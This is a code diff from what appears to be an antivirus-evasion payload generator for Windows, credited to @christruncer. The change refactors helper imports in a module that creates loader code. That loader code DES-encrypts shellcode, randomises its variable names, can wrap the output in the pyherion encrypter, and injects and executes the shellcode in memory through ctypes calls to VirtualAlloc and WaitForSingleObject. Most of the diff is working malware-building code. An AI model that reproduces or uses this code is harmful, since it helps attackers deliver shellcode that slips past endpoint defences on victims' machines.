@@ -9,11 +9,9 @@ module by @christruncer
 
 """
 
-from Crypto.Cipher import DES
-
 from modules.common import shellcode
-from modules.common import randomizer
-from modules.common import crypters
+from modules.common import helpers
+from modules.common import encryption
 
 
 class Payload:
@@ -28,8 +26,8 @@ class Payload:
         self.shellcode = shellcode.Shellcode()
         # options we require user interaction for- format is {Option : [Value, Description]]}
         self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                        "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                        "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"]}
+                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
+                                 "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"]}
     
     def generate(self):
         if self.required_options["inject_method"][0].lower() == "virtual":
@@ -38,22 +36,17 @@ class Payload:
             Shellcode = self.shellcode.generate()
         
             # Generate Random Variable Names
-            RandPtr = randomizer.randomString()
-            RandBuf = randomizer.randomString()
-            RandHt = randomizer.randomString()
-            ShellcodeVariableName = randomizer.randomString()
-            RandIV = randomizer.randomString()
-            RandDESKey = randomizer.randomString()
-            RandDESPayload = randomizer.randomString()
-            RandEncShellCodePayload = randomizer.randomString()
+            RandPtr = helpers.randomString()
+            RandBuf = helpers.randomString()
+            RandHt = helpers.randomString()
+            ShellcodeVariableName = helpers.randomString()
+            RandIV = helpers.randomString()
+            RandDESKey = helpers.randomString()
+            RandDESPayload = helpers.randomString()
+            RandEncShellCodePayload = helpers.randomString()
         
-            # Set IV Value and DES Key
-            iv = randomizer.randomKey(8)
-            DESKey = randomizer.randomKey(8)
-        
-            # Create DES Object and encrypt our payload
-            desmain = DES.new(DESKey, DES.MODE_CFB, iv)
-            EncShellCode = desmain.encrypt(Shellcode)
+            # encrypt the shellcode and get our randomized key/iv
+            (EncShellCode, (DESKey, iv) ) = encryption.encryptDES(Shellcode)
 
             # Create Payload File
             PayloadCode = 'from Crypto.Cipher import DES\n'
@@ -70,7 +63,7 @@ class Payload:
             PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))'
         
             if self.required_options["use_pyherion"][0].lower() == "y":
-                PayloadCode = crypters.pyherion(PayloadCode)
+                PayloadCode = encryption.pyherion(PayloadCode)
         
             return PayloadCode
 
@@ -80,25 +73,20 @@ class Payload:
             Shellcode = self.shellcode.generate()
         
             # Generate Random Variable Names
-            RandPtr = randomizer.randomString()
-            RandBuf = randomizer.randomString()
-            RandHt = randomizer.randomString()
-            ShellcodeVariableName = randomizer.randomString()
-            RandIV = randomizer.randomString()
-            RandDESKey = randomizer.randomString()
-            RandDESPayload = randomizer.randomString()
-            RandEncShellCodePayload = randomizer.randomString()
-            RandShellcode = randomizer.randomString()
-            RandReverseShell = randomizer.randomString()
-            RandMemoryShell = randomizer.randomString()
+            RandPtr = helpers.randomString()
+            RandBuf = helpers.randomString()
+            RandHt = helpers.randomString()
+            ShellcodeVariableName = helpers.randomString()
+            RandIV = helpers.randomString()
+            RandDESKey = helpers.randomString()
+            RandDESPayload = helpers.randomString()
+            RandEncShellCodePayload = helpers.randomString()
+            RandShellcode = helpers.randomString()
+            RandReverseShell = helpers.randomString()
+            RandMemoryShell = helpers.randomString()
         
-            # Set IV Value and DES Key
-            iv = randomizer.randomKey(8)
-            DESKey = randomizer.randomKey(8)
-        
-            # Create DES Object and encrypt our payload
-            desmain = DES.new(DESKey, DES.MODE_CFB, iv)
-            EncShellCode = desmain.encrypt(Shellcode)
+            # encrypt the shellcode and get our randomized key/iv
+            (EncShellCode, (DESKey, iv) ) = encryption.encryptDES(Shellcode)
 
             # Create Payload File
             PayloadCode = 'from Crypto.Cipher import DES\n'
@@ -113,6 +101,6 @@ class Payload:
             PayloadCode += RandShellcode + '()'
 
             if self.required_options["use_pyherion"][0].lower() == "y":
-                PayloadCode = crypters.pyherion(PayloadCode)
+                PayloadCode = encryption.pyherion(PayloadCode)
         
             return PayloadCode
